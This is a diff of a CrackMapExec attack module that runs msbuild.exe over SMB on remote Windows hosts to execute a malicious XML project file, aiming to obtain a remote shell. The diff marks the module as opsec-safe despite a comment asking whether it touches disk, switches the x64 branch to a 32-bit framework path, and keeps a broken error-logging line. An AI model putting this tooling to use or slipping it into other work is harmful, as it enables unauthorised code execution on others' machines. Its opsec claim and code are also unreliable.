@@ -4,10 +4,10 @@ import os
 class CMEModule:
     '''
     '''
-    name = 'msbuild'
+    name = 'msbuild2'
     description = 'Launches msbuild on a malicious .xml file'
     supported_protocols = ['smb']
-    opsec_safe= False #Does the module touch disk?
+    opsec_safe= True #Does the module touch disk?
     multiple_hosts = True #Does it make sense to run this module on multiple hosts at a time?
     def options(self, context, module_options):
         '''
@@ -38,11 +38,11 @@ class CMEModule:
             else:
                 pass
         if self.arch == 'x64':
-            winders = "%WINDIR%\\Microsoft.NET\\Framework64\\"+ self.ver+ "\\msbuild.exe"
-            command = '{} {} timeout 2 > file1.txt'.format(winders, self.targetFile)
+            winders = "%WINDIR%\\Microsoft.NET\\Framework\\"+ self.ver+ "\\msbuild.exe"
+            command = '{} {}'.format(winders, self.targetFile)
         elif self.arch == 'x86':
             winders = "%WINDIR%\\Microsoft.NET\\Framework\\"+ self.ver+ "\\msbuild.exe"
-            command = '{} {} timeout 2 > file1.txt'.format(winders, self.targetFile)
+            command = '{} {} '.format(winders, self.targetFile)
         else:
             print("You need to supply the 'ARCH' command line argument :)")
         try:
@@ -50,5 +50,4 @@ class CMEModule:
             context.log.success("Executed msbuild, hope you caught a shell!")
         except Exception as e:
             context.log.error("Msbuild failed")
-            context.log.debug("Error : ".format(str(e)))
             context.log.debug("Error : ".format(str(e)))
